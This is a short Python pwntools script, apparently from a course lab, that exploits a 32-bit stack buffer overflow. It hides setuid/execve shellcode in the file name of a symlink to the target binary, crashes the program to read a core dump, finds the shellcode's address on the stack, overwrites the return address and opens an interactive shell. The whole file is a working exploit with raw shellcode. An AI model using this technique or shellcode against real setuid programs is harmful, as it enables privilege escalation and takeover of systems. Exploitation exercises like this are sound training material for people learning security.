from pwn import *
from os import symlink
from os import remove

ARG1 = ''
ENV = {}

# Shellcode requires a symlink from A to //bin/sh to work
SHELLCODE = 'abc\xb8\xca\x11\x11\x11\xc1\xe0\x18\xc1\xe8\x18\xcd\x80\x89\xc3\x89\xc1\xb8\xcc\x11\x11\x11\xc1\xe0\x18\xc1\xe8\x18\xcd\x801\xc0PjA\x89\xe31\xc91\xd2\xb8\x1b\x11\x11\x11\xc1\xe0\x1c\xc1\xe8\x1c\xcd\x80'

# ENV = {'SHELLCODE': SHELLCODE}
# ARG1 = SHELLCODE
symlink("/home/labs/week3/stack-ovfl-no-envp-no-argv-32/stack-ovfl-no-envp-no-argv-32", SHELLCODE)

p = process([SHELLCODE, ARG1], env=ENV)

p.send("aaaa" * 500)
p.wait()

c = Core('./core')
addr_shellcode = c.stack.find(SHELLCODE)
addr_shellcode = addr_shellcode + 3

p = process([SHELLCODE, ARG1], env=ENV)
p.send(p32(addr_shellcode) * 100)
p.interactive()
remove(SHELLCODE)
